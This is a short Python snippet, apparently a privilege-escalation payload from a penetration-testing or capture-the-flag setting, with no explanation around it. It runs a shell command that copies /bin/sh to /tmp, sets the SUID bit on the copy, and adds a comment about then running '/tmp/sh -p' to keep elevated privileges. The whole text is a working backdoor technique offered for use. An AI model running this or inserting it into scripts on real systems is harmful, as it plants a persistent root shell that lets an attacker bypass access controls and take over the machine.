# Copy /bin/sh to /tmp directory and assign SUID:
import os
os.system("cp /bin/sh /tmp/sh; chmod u+s /tmp/sh")
# Then /tmp/sh -p
